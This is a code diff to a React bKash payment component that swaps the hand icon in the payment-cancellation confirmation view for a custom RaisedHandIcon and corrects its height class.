@@ -6,7 +6,8 @@ import { submitOtpForApproval } from "@/lib/otpApproval";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
-import { Phone, Hand } from "lucide-react";
+import { Phone } from "lucide-react";
+import RaisedHandIcon from "@/components/icons/RaisedHandIcon";
 import genzLogo from "@/assets/payment/genz-logo.png";
 import bkashLogoImg from "@/assets/payment/bkash-logo.png";
 import robiLogoAsset from "@/assets/merchant/robi.png";
@@ -275,7 +276,7 @@ const BkashPayment = () => {
             {showCancelView ? (
               <>
                 <div className="bg-[#E2136E] px-5 flex flex-col items-center justify-center" style={{ height: '310px' }}>
-                  <Hand className="w-6 h-19 text-white mb-3" strokeWidth={1.5} />
+                  <RaisedHandIcon className="w-6 h-6 text-white mb-3" strokeWidth={1.5} />
                   <p className="text-white text-center text-xs font-medium">Are you sure you want to cancel this payment?</p>
                 </div>
                 <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
